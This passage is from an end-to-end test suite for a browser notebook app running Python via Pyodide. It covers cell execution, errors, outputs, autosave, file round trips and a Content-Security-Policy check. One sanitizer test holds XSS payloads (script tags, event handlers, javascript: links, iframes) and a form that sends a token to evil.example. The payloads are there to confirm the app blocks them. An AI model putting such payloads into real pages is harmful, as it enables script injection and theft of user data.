/** End-to-end tests of the notebook engine, in a real browser with Pyodide from the npm package. */
import {
  assert,
  assertEqual,
  assertExcludes,
  assertIncludes,
  cell,
  download,
  hasError,
  notebook,
  openApp,
  openNotebook,
  outputText,
  runAll,
  runCell,
  waitIdle,
  waitSaved,
} from './helpers.mjs'

/** NumPy cannot be downloaded where these tests usually run; that request is expected to fail. */
const EXPECTED_PROBLEMS = [/numpy/i, /status of 404/]

function unexpected(problems) {
  return problems.filter((line) => !EXPECTED_PROBLEMS.some((pattern) => pattern.test(line)))
}

export function register(suite, env) {
  const fresh = async (options = {}) => {
    const context = await env.browser.newContext({ viewport: { width: 1280, height: 900 }, acceptDownloads: true, ...options })
    const app = await openApp(context, `${env.url}/playground`)
    return { context, ...app }
  }

  suite.test('first visit shows the first sample notebook; no console errors', async () => {
    const { context, page, problems } = await fresh()
    await page.waitForFunction(() => document.title.startsWith('00-check-your-setup.ipynb'))
    assertEqual(await page.locator('#notebook-select').inputValue(), 'sample:00-check-your-setup.ipynb', 'selected notebook')
    assertEqual(await page.locator('#notebook-select option').count(), 6, 'six sample notebooks in the menu')
    assertIncludes(await page.locator('.runtime-status').innerText(), 'Python starts when you run a cell', 'runtime is not started yet')
    assertEqual(unexpected(problems), [], 'console problems')
    await context.close()
  })

  suite.test('run a cell: stdout, last value, execution count, status line', async () => {
    const { context, page, problems } = await fresh()
    await openNotebook(page, notebook(['print("hello", 6 * 7)\n"last value"', 'x = 5\nx * 2;', 'x']))
    assertEqual(await cell(page, 0).locator('.cell-count').innerText(), '[ ]', 'count before running')
    await runCell(page, 0)
    assertEqual(await cell(page, 0).locator('.cell-count').innerText(), '[1]', 'count after running')
    const text = await outputText(page, 0)
    assertIncludes(text, 'hello 42', 'stdout')
    assertIncludes(text, "'last value'", 'repr of the last expression')
    await runCell(page, 1)
    assertEqual((await outputText(page, 1)).trim(), '', 'a trailing semicolon hides the value')
    await runCell(page, 2)
    assertEqual((await outputText(page, 2)).trim(), '5', 'variables persist between cells')
    assertEqual(await cell(page, 2).locator('.cell-count').innerText(), '[3]', 'counts go up')
    assertEqual(await page.locator('.runtime-status').getAttribute('data-runtime'), 'idle', 'status is idle')
    assertIncludes(await page.locator('.runtime-status').innerText(), 'Python 3.', 'status names the Python version')
    assertEqual(unexpected(problems), [], 'console problems')
    await context.close()
  })

  suite.test('keyboard: type code, Shift+Enter runs and moves on, Ctrl+Enter runs in place, Escape leaves', async () => {
    const { context, page } = await fresh()
    await openNotebook(page, notebook(['', '']))
    await cell(page, 0).locator('.cm-content').click()
    await page.keyboard.type('print("typed " + str(2 ** 10))')
    await page.keyboard.press('Shift+Enter')
    await waitIdle(page)
    assertIncludes(await outputText(page, 0), 'typed 1024', 'Shift+Enter ran the cell')
    assert(await cell(page, 1).locator('.cm-content').evaluate((node) => node === document.activeElement), 'focus moved to the next cell')
    await page.keyboard.type('print("second")')
    await page.keyboard.press('Control+Enter')
    await waitIdle(page)
    assertIncludes(await outputText(page, 1), 'second', 'Ctrl+Enter ran the cell')
    assert(await cell(page, 1).locator('.cm-content').evaluate((node) => node === document.activeElement), 'focus stayed in the cell')
    await page.keyboard.press('Escape')
    assert(await cell(page, 1).locator('.run-button').evaluate((node) => node === document.activeElement), 'Escape moved focus to the run button')
    const outline = await cell(page, 1).locator('.run-button').evaluate((node) => getComputedStyle(node).outlineStyle)
    assert(outline !== 'none', 'the focused button shows a focus outline')
    // From there the keyboard reaches the cell's buttons, and Enter on the run button runs the cell.
    await page.keyboard.press('Enter')
    await waitIdle(page)
    assertEqual(await cell(page, 1).locator('.cell-count').innerText(), '[3]', 'Enter on the run button ran the cell again')
    assert(await cell(page, 1).locator('.run-button').evaluate((node) => node === document.activeElement), 'focus is still on the run button after the run')
    await page.keyboard.press('Tab')
    assert(await cell(page, 1).locator('.check-toggle').evaluate((node) => node === document.activeElement), 'Tab reaches the cell tools')
    await context.close()
  })

  suite.test('output streams while the cell is still running, and the page stays responsive', async () => {
    const { context, page } = await fresh()
    await openNotebook(
      page,
      notebook([
        'import time\nprint("first")\nstart = time.time()\nwhile time.time() - start < 1.5:\n    pass\nprint("second")',
        'import asyncio, sys\nprint("partial", end="")\nawait asyncio.sleep(0.8)\nprint(" line", file=sys.stderr)',
      ]),
    )
    await runCell(page, 0) // starts Python, so the timing below is about the cell only
    await cell(page, 0).locator('.run-button').click()
    await page.waitForFunction(() => document.querySelector('.cell .cell-outputs')?.textContent.includes('first'))
    const during = await page.evaluate(() => ({
      text: document.querySelector('.cell .cell-outputs').textContent,
      running: document.querySelector('.cell').classList.contains('is-running'),
      status: document.querySelector('.runtime-status').dataset.runtime,
    }))
    assert(during.running, 'the cell is still running when "first" is shown')
    assertExcludes(during.text, 'second', '"second" is not printed yet')
    assertEqual(during.status, 'running', 'status says running')
    // The page is not frozen by the busy loop: it still answers at once.
    const before = Date.now()
    await page.evaluate(() => new Promise((resolve) => requestAnimationFrame(resolve)))
    assert(Date.now() - before < 500, 'the page renders frames while Python is busy')
    await waitIdle(page)
    assertIncludes(await outputText(page, 0), 'second', 'the rest arrives')

    await cell(page, 1).locator('.run-button').click()
    await page.waitForFunction(() => document.querySelectorAll('.cell')[1].querySelector('.cell-outputs').textContent.includes('partial'))
    assert(await cell(page, 1).evaluate((node) => node.classList.contains('is-running')), 'a partial line is shown before the cell ends')
    await waitIdle(page)
    assertEqual((await cell(page, 1).locator('.stream-stderr').innerText()).trim(), 'line', 'stderr is a separate output')
    await context.close()
  })

  suite.test('errors: traceback with the cell line, syntax errors, and the cell after still runs', async () => {
    const { context, page } = await fresh()
    await openNotebook(
      page,
      notebook(['def divide(a, b):\n    return a / b\n\ndivide(1, 0)', 'for x in range(3) print(x)', 'undefined_name', '"still works"']),
    )
    await runCell(page, 0)
    const trace = await cell(page, 0).locator('.output-error').innerText()
    assertIncludes(trace, 'Traceback (most recent call last)', 'traceback header')
    assertIncludes(trace, 'File "<cell [1]>", line 4', 'the frame of the cell')
    assertIncludes(trace, 'return a / b', 'the source line inside the function')
    assertIncludes(trace, 'ZeroDivisionError: division by zero', 'the exception')
    assertExcludes(trace, '_runtime.py', 'no frames of the notebook machinery')
    assertExcludes(trace, 'pyodide', 'no frames of Pyodide')
    await runCell(page, 1)
    assertIncludes(await cell(page, 1).locator('.output-error').innerText(), 'SyntaxError', 'syntax error')
    await runCell(page, 2)
    assertIncludes(await cell(page, 2).locator('.output-error').innerText(), "NameError: name 'undefined_name' is not defined", 'name error')
    await runCell(page, 3)
    assertIncludes(await outputText(page, 3), 'still works', 'the runtime survives errors')
    await context.close()
  })

  suite.test('top-level await works, and an awaitable as the last value is awaited', async () => {
    const { context, page } = await fresh()
    await openNotebook(
      page,
      notebook([
        'import asyncio\nawait asyncio.sleep(0.01)\nasync def answer():\n    await asyncio.sleep(0.01)\n    return 41 + 1\nvalue = await answer()\nprint("awaited", value)',
        'answer()',
      ]),
    )
    await runAll(page)
    assertIncludes(await outputText(page, 0), 'awaited 42', 'top-level await')
    assertEqual((await outputText(page, 1)).trim(), '42', 'a coroutine as the last value is awaited, not shown as an object')
    await context.close()
  })

  suite.test('rich outputs: HTML, table, image, audio, _repr_html_, display()', async () => {
    const { context, page } = await fresh()
    const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg=='
    await openNotebook(
      page,
      notebook([
        'import lab\nlab.html("<p id=\'x\'>Hello <b>bold</b></p><svg width=\'40\' height=\'20\'><circle cx=\'10\' cy=\'10\' r=\'5\'/></svg>")',
        'lab.table([{"token": "the", "p": 0.5}, {"token": "<b>cat</b>", "p": 0.25}])',
        `import base64\nlab.show(base64.b64decode("${png}"))`,
        'import math\nlab.play([0.5 * math.sin(2 * math.pi * 440 * i / 8000) for i in range(4000)], 8000)',
        'class Card:\n    def _repr_html_(self):\n        return "<em class=\'card\'>card</em>"\nCard()',
        'display({"a": 1})\nprint("after display")',
      ]),
    )
    await runAll(page)
    for (let i = 0; i < 6; i++) assert(!(await hasError(page, i)), `cell ${i} ran without error: ${await outputText(page, i)}`)
    assertEqual(await cell(page, 0).locator('.output-html b').innerText(), 'bold', 'HTML output')
    assertEqual(await cell(page, 0).locator('.output-html svg circle').count(), 1, 'inline SVG is kept')
    assertEqual(await cell(page, 1).locator('table tbody tr').count(), 2, 'table rows')
    assertEqual(await cell(page, 1).locator('table th').allInnerTexts(), ['token', 'p'], 'table header')
    assertEqual(await cell(page, 1).locator('table tbody tr').nth(1).locator('td').first().innerText(), '<b>cat</b>', 'table text is escaped')
    const img = cell(page, 2).locator('.cell-outputs img')
    assert((await img.getAttribute('src')).startsWith('data:image/png;base64,'), 'image output is a PNG data address')
    assertEqual(await img.evaluate((node) => node.naturalWidth), 1, 'the image decodes')
    const audio = cell(page, 3).locator('.cell-outputs audio')
    assert((await audio.getAttribute('src')).startsWith('data:audio/wav;base64,'), 'audio player with a WAV data address')
    await audio.evaluate((node) => new Promise((resolve, reject) => {
      if (node.readyState >= 1) return resolve()
      node.addEventListener('loadedmetadata', resolve, { once: true })
      node.addEventListener('error', () => reject(new Error('audio failed to load')), { once: true })
    }))
    const duration = await audio.evaluate((node) => node.duration)
    assert(Math.abs(duration - 0.5) < 0.01, `the browser reads the WAV as half a second (got ${duration})`)
    assertEqual(await cell(page, 4).locator('.output-html em').innerText(), 'card', '_repr_html_ is used for the last value')
    assertIncludes(await outputText(page, 5), "{'a': 1}", 'display() shows a value')
    await context.close()
  })

  suite.test('a package that cannot be downloaded gives a clear error (NumPy here)', async () => {
    const { context, page } = await fresh()
    await openNotebook(page, notebook(['import numpy as np\nprint(np.arange(3))', 'print("next cell runs")']))
    await runCell(page, 0)
    const text = await outputText(page, 0)
    if (text.includes('[0 1 2]')) {
      console.log('        (NumPy loaded in this environment, so the failure message was not exercised)')
    } else {
      assertIncludes(text, 'PackageLoadError', 'error name')
      assertIncludes(text, 'Could not load the Python package numpy', 'names the package')
      assertIncludes(text, 'check your internet connection', 'says what to do')
    }
    await runCell(page, 1)
    assertIncludes(await outputText(page, 1), 'next cell runs', 'the runtime is still usable')
    await context.close()
  })

  suite.test('restart: variables are gone, counts start again, a running cell is stopped', async () => {
    const { context, page } = await fresh()
    await openNotebook(page, notebook(['secret = 123', 'secret', 'while True:\n    pass']))
    await runCell(page, 0)
    await runCell(page, 1)
    assertEqual((await outputText(page, 1)).trim(), '123', 'variable is set')
    await page.getByRole('button', { name: 'Restart' }).click()
    await page.waitForFunction(() => document.querySelector('.runtime-status').dataset.runtime === 'idle')
    await runCell(page, 1)
    assertIncludes(await outputText(page, 1), "NameError: name 'secret' is not defined", 'the variable is gone after a restart')
    assertEqual(await cell(page, 1).locator('.cell-count').innerText(), '[1]', 'execution counts start again')
    // An endless loop cannot freeze the page, and Restart ends it.
    await cell(page, 2).locator('.run-button').click()
    await page.waitForFunction(() => document.querySelectorAll('.cell')[2].classList.contains('is-running'))
    await page.waitForTimeout(300)
    await page.getByRole('button', { name: 'Restart' }).click()
    await waitIdle(page)
    assertIncludes(await outputText(page, 2), 'The runtime was restarted while this cell was running', 'the stopped cell says why it ended')
    await runCell(page, 0)
    assert(!(await hasError(page, 0)), 'cells run again after the restart')
    await context.close()
  })

  suite.test('if Python cannot be downloaded, the cell says so, and Restart recovers once the network is back', async () => {
    const { context, page } = await fresh()
    await openNotebook(page, notebook(['print("finally")']))
    await context.route('**/pyodide/pyodide.mjs', (route) => route.abort())
    await runCell(page, 0)
    const text = await outputText(page, 0)
    assertIncludes(text, 'Python could not start', 'the cell shows why nothing ran')
    assertIncludes(text, 'Check your internet connection', 'and what to do')
    assertEqual(await page.locator('.runtime-status').getAttribute('data-runtime'), 'failed', 'the status line shows the failure')
    assertIncludes(await page.locator('.runtime-status').innerText(), 'press Restart', 'the status line says how to retry')
    await context.unroute('**/pyodide/pyodide.mjs')
    await page.getByRole('button', { name: 'Restart' }).click()
    await page.waitForFunction(() => document.querySelector('.runtime-status').dataset.runtime === 'idle')
    await runCell(page, 0)
    assertIncludes(await outputText(page, 0), 'finally', 'Python runs after the restart')
    await context.close()
  })

  suite.test('open and download: ids, unknown metadata, attachments and outputs survive the round trip', async () => {
    const { context, page } = await fresh()
    const original = {
      cells: [
        {
          cell_type: 'markdown',
          id: 'intro-cell',
          metadata: { custom: { keep: [1, 2, 3] } },
          attachments: { 'a.png': { 'image/png': 'AAAA' } },
          source: ['# Title\n', 'Second line'],
        },
        {
          cell_type: 'code',
          id: 'code-cell-1',
          metadata: { tags: ['check', 'other'], nbgrader: { grade: true, points: 2 } },
          execution_count: 7,
          outputs: [
            { output_type: 'stream', name: 'stdout', text: ['line 1\n', 'line 2\n'] },
            { output_type: 'execute_result', execution_count: 7, metadata: {}, data: { 'text/plain': ['42'], 'application/vnd.custom+json': { a: 1 } } },
          ],
          source: 'print("line 1")\nprint("line 2")\n42',
        },
        { cell_type: 'raw', id: 'raw-cell', metadata: { format: 'text/latex' }, source: ['\\newpage'] },
      ],
      metadata: {
        kernelspec: { display_name: 'Python 3 (ipykernel)', language: 'python', name: 'python3' },
        language_info: { name: 'python', version: '3.12.1' },
        colab: { provenance: [], toc_visible: true },
        course: { assignment: 'A1' },
      },
      nbformat: 4,
      nbformat_minor: 5,
    }
    await openNotebook(page, original, 'roundtrip.ipynb')
    assertIncludes(await outputText(page, 1), 'line 1\nline 2', 'stored outputs are shown')
    assertEqual(await cell(page, 1).locator('.cell-count').innerText(), '[7]', 'stored execution count is shown')
    assertEqual(await cell(page, 1).locator('.cell-check').getAttribute('data-state'), 'passed', 'a stored check result is shown')
    const saved = await download(page)
    assertEqual(saved.name, 'roundtrip.ipynb', 'download name')
    assert(saved.text.endsWith('\n'), 'file ends with a newline')
    const result = JSON.parse(saved.text)
    assertEqual(result.nbformat, 4, 'nbformat')
    assertEqual(result.nbformat_minor, 5, 'nbformat_minor')
    assertEqual(result.metadata, original.metadata, 'notebook metadata is unchanged')
    assertEqual(result.cells.map((c) => c.id), ['intro-cell', 'code-cell-1', 'raw-cell'], 'cell ids are kept')
    assertEqual(result.cells[0].metadata, original.cells[0].metadata, 'cell metadata is kept')
    assertEqual(result.cells[0].attachments, original.cells[0].attachments, 'attachments are kept')
    assertEqual(result.cells[0].source, ['# Title\n', 'Second line'], 'source is written as lines')
    assert(!('outputs' in result.cells[0]), 'markdown cells have no outputs key')
    assertEqual(result.cells[1].metadata, original.cells[1].metadata, 'tags and nbgrader metadata are kept')
    assertEqual(result.cells[1].outputs, original.cells[1].outputs, 'outputs are unchanged')
    assertEqual(result.cells[1].execution_count, 7, 'execution count is kept')
    assertEqual(result.cells[2], original.cells[2], 'raw cells are kept')
    // The downloaded file opens again and gives the same file.
    await openNotebook(page, saved.text, 'again.ipynb')
    assertEqual(JSON.parse((await download(page)).text), result, 'a second round trip changes nothing')
    await context.close()
  })

  suite.test('drag and drop opens a notebook; a file that is not a notebook is refused with a message', async () => {
    const { context, page } = await fresh()
    const drop = (name, text) =>
      page.evaluate(
        ([fileName, content]) => {
          const data = new DataTransfer()
          data.items.add(new File([content], fileName, { type: 'application/json' }))
          for (const type of ['dragenter', 'dragover', 'drop']) {
            window.dispatchEvent(new DragEvent(type, { dataTransfer: data, bubbles: true, cancelable: true }))
          }
        },
        [name, text],
      )
    await drop('dropped.ipynb', JSON.stringify(notebook([{ md: '# Dropped notebook' }, 'print("from a dropped file")'])))
    await page.waitForFunction(() => document.title.startsWith('dropped.ipynb'))
    assertEqual(await cell(page, 0).locator('h1').innerText(), 'Dropped notebook', 'the dropped notebook is shown')
    await drop('notes.txt', 'this is not a notebook')
    await page.waitForSelector('.notice:not([hidden])')
    assertIncludes(await page.locator('.notice').innerText(), 'not valid JSON', 'a clear message')
    assert((await page.title()).startsWith('dropped.ipynb'), 'the open notebook is untouched')
    await drop('old.ipynb', JSON.stringify({ nbformat: 3, worksheets: [] }))
    await page.waitForFunction(() => document.querySelector('.notice').innerText.includes('nbformat 3'))
    await context.close()
  })

  suite.test('check cells: badge, summary, toggle, and the tag is saved in the file', async () => {
    const { context, page } = await fresh()
    await openNotebook(
      page,
      notebook([
        'def add(a, b):\n    return a + b',
        { code: 'assert add(2, 3) == 5\nprint("add works")', tags: ['check'] },
        { code: 'assert add(2, 2) == 5, "2 + 2 should be 5 (this check fails on purpose)"', tags: ['check'] },
        'print("after the failed check")',
      ]),
    )
    const state = (i) => cell(page, i).locator('.cell-check').getAttribute('data-state')
    assertEqual(await state(1), 'not-run', 'badge before running')
    assertEqual(await page.locator('.checks-summary').innerText(), 'Checks: 0 of 2 passed', 'summary before running')
    assert(await cell(page, 0).locator('.cell-check').isHidden(), 'ordinary cells have no badge')
    await runAll(page)
    assertEqual(await state(1), 'passed', 'passing check')
    assertEqual(await cell(page, 1).locator('.cell-check').innerText(), 'Check passed', 'badge text')
    assertEqual(await state(2), 'failed', 'failing check')
    assertIncludes(await outputText(page, 2), 'AssertionError: 2 + 2 should be 5', 'the assertion message is shown')
    assertIncludes(await outputText(page, 3), 'after the failed check', 'Run all continues after a failed check')
    assertEqual(await page.locator('.checks-summary').innerText(), 'Checks: 1 of 2 passed', 'summary after running')
    // Toggle: cell 0 becomes a check, cell 2 stops being one.
    await cell(page, 0).hover()
    await cell(page, 0).locator('.check-toggle').click()
    assertEqual(await cell(page, 0).locator('.check-toggle').getAttribute('aria-pressed'), 'true', 'toggle is pressed')
    assertEqual(await state(0), 'passed', 'the new check cell already ran without error')
    await cell(page, 2).hover()
    await cell(page, 2).locator('.check-toggle').click()
    assert(await cell(page, 2).locator('.cell-check').isHidden(), 'badge is gone when the tag is removed')
    const saved = JSON.parse((await download(page)).text)
    assertEqual(saved.cells.map((c) => c.metadata.tags ?? null), [['check'], ['check'], null, null], 'tags in the downloaded file')
    await context.close()
  })

  suite.test('Run all stops at the first error of an ordinary cell', async () => {
    const { context, page } = await fresh()
    await openNotebook(page, notebook(['print("one")', 'raise ValueError("stop here")', 'print("three")']))
    await runAll(page)
    assertIncludes(await outputText(page, 1), 'ValueError: stop here', 'the error is shown')
    assertEqual(await cell(page, 2).locator('.cell-count').innerText(), '[ ]', 'the cell after the error did not run')
    await context.close()
  })

  suite.test('cells: add, type, convert, move, delete, undo, clear outputs', async () => {
    const { context, page } = await fresh()
    await openNotebook(page, notebook(['print("A")', 'print("B")']))
    const sources = () => page.evaluate(() => Array.from(document.querySelectorAll('.cell'), (c) => (c.querySelector('.cell-rendered:not([hidden])') ?? c.querySelector('.cm-content')).innerText.trim()))
    await cell(page, 0).hover()
    await cell(page, 0).getByRole('button', { name: 'Add a text cell below' }).click()
    await page.keyboard.type('## A heading')
    await page.keyboard.press('Shift+Enter')
    assertEqual(await cell(page, 1).locator('h2').innerText(), 'A heading', 'the new text cell renders Markdown')
    assertEqual(await page.locator('.cell').count(), 3, 'three cells')
    await cell(page, 1).locator('.cell-rendered').dblclick()
    assert(await cell(page, 1).locator('.cm-content').isVisible(), 'double click edits a text cell')
    await page.keyboard.press('Shift+Enter')
    await cell(page, 2).hover()
    await cell(page, 2).getByRole('button', { name: 'Move cell up' }).click()
    assertEqual(await sources(), ['print("A")', 'print("B")', 'A heading'], 'moved up')
    assert(await cell(page, 0).getByRole('button', { name: 'Move cell up' }).isDisabled(), 'the first cell cannot move up')
    await cell(page, 0).hover()
    await cell(page, 0).getByRole('button', { name: 'Delete cell' }).click()
    assertEqual(await sources(), ['print("B")', 'A heading'], 'deleted')
    await page.getByRole('button', { name: 'Undo' }).click()
    assertEqual(await sources(), ['print("A")', 'print("B")', 'A heading'], 'undo brings the cell back')
    await cell(page, 2).hover()
    await cell(page, 2).getByRole('button', { name: 'Change to a code cell' }).click()
    assertEqual(await cell(page, 2).getAttribute('class'), 'cell cell-code', 'converted to code')
    await runAll(page)
    assertIncludes(await outputText(page, 0), 'A', 'ran')
    await page.getByRole('button', { name: 'Clear outputs' }).click()
    assertEqual((await outputText(page, 0)).trim(), '', 'outputs cleared')
    assertEqual(await cell(page, 0).locator('.cell-count').innerText(), '[ ]', 'counts cleared')
    await context.close()
  })

  suite.test('autosave: work survives a reload, the state is shown, each sample keeps its own copy', async () => {
    const { context, page } = await fresh()
    await page.waitForFunction(() => document.title.startsWith('00-check-your-setup.ipynb'))
    const firstCode = page.locator('.cell-code').first()
    await firstCode.locator('.cm-content').click()
    await page.keyboard.press('Control+a')
    await page.keyboard.type('print("my edit")')
    assertEqual(await page.locator('.save-state').getAttribute('data-save'), 'pending', 'unsaved state is visible')
    await waitSaved(page)
    assertEqual(await page.locator('.save-state').innerText(), 'Saved in this browser', 'saved state text')
    await firstCode.locator('.run-button').click()
    await waitIdle(page)
    await waitSaved(page)
    await page.reload()
    await page.waitForSelector('.cell-code')
    assert((await page.title()).startsWith('00-check-your-setup.ipynb'), 'the same notebook is open after a reload')
    assertEqual(await page.locator('.cell-code').first().locator('.cm-content').innerText(), 'print("my edit")', 'the edit survived')
    assertIncludes(await page.locator('.cell-code').first().locator('.cell-outputs').innerText(), 'my edit', 'the output survived')
    // Another sample and back: both keep their state.
    await page.selectOption('#notebook-select', 'sample:04-attention-from-scratch.ipynb')
    await page.waitForFunction(() => document.title.startsWith('04-attention'))
    await page.selectOption('#notebook-select', 'sample:00-check-your-setup.ipynb')
    await page.waitForFunction(() => document.title.startsWith('00-check'))
    assertEqual(await page.locator('.cell-code').first().locator('.cm-content').innerText(), 'print("my edit")', 'the copy of sample 00 is kept')
    // Reset brings the original back.
    page.once('dialog', (dialog) => dialog.accept())
    await page.getByRole('button', { name: 'Reset' }).click()
    await page.waitForFunction(() => !document.querySelector('.cell-code .cm-content').innerText.includes('my edit'))
    await context.close()
  })

  suite.test('autosave copes with full storage: saves without outputs and says so', async () => {
    const { context, page } = await fresh()
    await openNotebook(page, notebook(['print("x" * 100)']))
    // Leave room for the notebook's source but not for a large output.
    await page.evaluate(() => {
      const original = Storage.prototype.setItem
      Storage.prototype.setItem = function (key, value) {
        if (String(value).length > 3000) throw new DOMException('full', 'QuotaExceededError')
        return original.call(this, key, value)
      }
    })
    await cell(page, 0).locator('.cm-content').click()
    await page.keyboard.press('Control+a')
    await page.keyboard.type('print("y" * 5000)')
    await page.keyboard.press('Control+Enter')
    await waitIdle(page)
    await page.waitForFunction(() => document.querySelector('.save-state').dataset.save === 'partial')
    assertIncludes(await page.locator('.save-state').innerText(), 'without outputs', 'the page says what was saved')
    const stored = await page.evaluate(() => JSON.parse(localStorage.getItem('notebook-lab:doc:file')).text)
    assertIncludes(stored, 'print(\\"y\\" * 5000)', 'the source is saved')
    assertExcludes(stored, 'yyyyyyyyyy', 'the output is not')
    await context.close()
  })

  suite.test('untrusted notebooks: scripts in Markdown and in stored or live HTML output never run', async () => {
    const { context, page, problems } = await fresh()
    const attack = [
      '<script>window.__xss = "script"</script>',
      '<img src="x" onerror="window.__xss = \'onerror\'">',
      '<svg onload="window.__xss = \'svg\'"><script>window.__xss = "svgscript"</script></svg>',
      '<a id="bad-link" href="javascript:window.__xss=\'link\'">click me</a>',
      '<iframe srcdoc="<script>parent.__xss = \'iframe\'</script>"></iframe>',
      '<form action="https://evil.example/steal"><input name="token"><button>Send</button></form>',
      '<style>body { display: none !important }</style>',
      '<div style="position:fixed;inset:0;background:red" id="overlay">overlay</div>',
      '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">',
      '<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example/">',
      '<math><mtext><script>window.__xss = "math"</script></mtext></math>',
      '<details open ontoggle="window.__xss = \'toggle\'">d</details>',
    ].join('\n')
    await openNotebook(
      page,
      notebook([
        { md: `# Looks harmless\n\n${attack}\n\n[md link](javascript:window.__xss='mdlink') and ![img](x "t" onerror=alert(1))` },
        {
          code: 'print("stored output")',
          execution_count: 1,
          outputs: [
            { output_type: 'display_data', metadata: {}, data: { 'text/html': attack, 'text/plain': 'x' } },
            { output_type: 'execute_result', execution_count: 1, metadata: {}, data: { 'image/svg+xml': '<svg xmlns="http://www.w3.org/2000/svg" onload="window.__xss=\'svgimg\'"><script>window.__xss="svgimg2"</script><rect width="10" height="10"/></svg>', 'text/plain': 'svg' } },
            { output_type: 'display_data', metadata: {}, data: { 'text/markdown': attack } },
            { output_type: 'display_data', metadata: {}, data: { 'image/png': '"><script>window.__xss="png"</script>' } },
            { output_type: 'error', ename: 'E', evalue: 'v', traceback: ['<img src=x onerror="window.__xss=\'trace\'">'] },
            { output_type: 'stream', name: 'stdout', text: '<script>window.__xss="stream"</script>' },
          ],
        },
        `import lab\nlab.html(${JSON.stringify(attack)})\nclass Evil:\n    def _repr_html_(self):\n        return ${JSON.stringify(attack)}\nEvil()`,
      ]),
      'evil.ipynb',
    )
    await runCell(page, 2)
    await page.waitForTimeout(300)
    await page.locator('#bad-link, a:has-text("click me")').first().click({ force: true, noWaitAfter: true }).catch(() => {})
    await page.locator('a:has-text("md link")').click({ force: true, noWaitAfter: true }).catch(() => {})
    await page.waitForTimeout(200)
    assertEqual(await page.evaluate(() => window.__xss ?? null), null, 'no injected script ran')
    const found = await page.evaluate(() => {
      const scope = document.querySelector('#notebook')
      const handlers = Array.from(scope.querySelectorAll('*')).filter((node) => Array.from(node.attributes).some((a) => a.name.startsWith('on')))
      return {
        scripts: scope.querySelectorAll('script').length,
        frames: scope.querySelectorAll('iframe, object, embed').length,
        forms: scope.querySelectorAll('form, input, button:not([class])').length,
        styles: scope.querySelectorAll('style, base, meta, link').length,
        handlers: handlers.length,
        javascriptLinks: Array.from(scope.querySelectorAll('a')).filter((a) => /^\s*javascript:/i.test(a.getAttribute('href') ?? '')).length,
        fixed: Array.from(scope.querySelectorAll('.markdown *, .output-rich *')).filter((node) => getComputedStyle(node).position === 'fixed').length,
        bodyVisible: getComputedStyle(document.body).display !== 'none',
        linkTargets: Array.from(scope.querySelectorAll('.markdown a[href], .output-rich a[href]'), (a) => `${a.target}|${a.rel}`),
      }
    })
    assertEqual(found.scripts, 0, 'no script elements in the notebook')
    assertEqual(found.frames, 0, 'no frames or plugins')
    assertEqual(found.forms, 0, 'no forms or form controls from the notebook')
    assertEqual(found.styles, 0, 'no style sheets, base or meta from the notebook')
    assertEqual(found.handlers, 0, 'no event handler attributes')
    assertEqual(found.javascriptLinks, 0, 'no javascript: links')
    assertEqual(found.fixed, 0, 'nothing from a notebook is positioned over the page')
    assert(found.bodyVisible, 'the page is still visible')
    assert(found.linkTargets.every((value) => value === '_blank|noopener noreferrer nofollow'), 'links open in a new tab without a referrer')
    assertIncludes(await outputText(page, 1), '<script>window.__xss="stream"</script>', 'text outputs are shown as text')
    // The Content-Security-Policy would also have blocked inline scripts: nothing was even attempted.
    assertEqual(problems.filter((line) => /Content Security Policy/i.test(line) && /script/i.test(line)), [], 'no script reached the policy')
    await context.close()
  })

  suite.test('the Content-Security-Policy from public/_headers is in force and allows the app', async () => {
    const { context, page, problems } = await fresh()
    const response = await page.request.get(env.url)
    const csp = response.headers()['content-security-policy'] ?? ''
    assertIncludes(csp, "script-src 'self' 'wasm-unsafe-eval'", 'the test server sends the policy')
    assertExcludes(csp, "'unsafe-eval'", 'no unsafe-eval')
    assertExcludes(csp.split('script-src')[1].split(';')[0], "'unsafe-inline'", 'no inline scripts')
    const blocked = await page.evaluate(
      () =>
        new Promise((resolve) => {
          document.addEventListener('securitypolicyviolation', (event) => resolve(event.violatedDirective), { once: true })
          const script = document.createElement('script')
          script.textContent = 'window.__inline = true'
          document.head.append(script)
          setTimeout(() => resolve(window.__inline ? 'ran' : 'no event'), 500)
        }),
    )
    assertIncludes(String(blocked), 'script-src', 'an inline script is blocked by the policy')
    await openNotebook(page, notebook(['import json, zlib, sqlite3\nprint("python works under the policy")']))
    await runCell(page, 0)
    assertIncludes(await outputText(page, 0), 'python works under the policy', 'Pyodide runs under the policy')
    assertEqual(problems.filter((line) => !/Refused to execute inline script|__inline|script-src/.test(line)), [], 'no other console problems')
    await context.close()
  })

  suite.test('Markdown: headings, lists, code, tables and formulas render', async () => {
    const { context, page } = await fresh()
    await openNotebook(
      page,
      notebook([
        { md: '# Title\n\nInline $e^{i\\pi} + 1 = 0$ and a price of $5 and $6.\n\n$$\\mathrm{softmax}(z)_i = \\frac{e^{z_i}}{\\sum_j e^{z_j}}$$\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```python\nx = 1\n```' },
      ]),
    )
    const first = cell(page, 0)
    assertEqual(await first.locator('h1').innerText(), 'Title', 'heading')
    assertEqual(await first.locator('li').count(), 2, 'list')
    assertEqual(await first.locator('table td').count(), 2, 'table')
    assertEqual(await first.locator('pre code').innerText(), 'x = 1\n', 'code block')
    assertEqual(await first.locator('.katex').count(), 2, 'two formulas (the prices are not a formula)')
    assertEqual(await first.locator('.math-block .katex-display').count(), 1, 'one display formula')
    assertIncludes(await first.locator('.cell-rendered').innerText(), 'a price of $5 and $6', 'dollar amounts stay text')
    const fonts = await page.evaluate(() => document.fonts.ready.then(() => Array.from(document.fonts).filter((f) => f.status === 'loaded' && f.family.includes('KaTeX')).length))
    assert(fonts > 0, 'the formula fonts load from this site')
    await context.close()
  })

  for (const [width, height] of [
    [1280, 900],
    [390, 844],
  ]) {
    suite.test(`layout at ${width} px: nothing overflows sideways; light and dark screenshots`, async () => {
      for (const scheme of ['light', 'dark']) {
        const { context, page, problems } = await fresh({
          viewport: { width, height },
          deviceScaleFactor: 1,
          colorScheme: scheme,
          hasTouch: width < 600,
          isMobile: width < 600,
        })
        await page.selectOption('#notebook-select', 'sample:04-attention-from-scratch.ipynb')
        await page.waitForFunction(() => document.title.startsWith('04-attention'))
        // Run a notebook that needs no NumPy, so the screenshot shows real outputs everywhere.
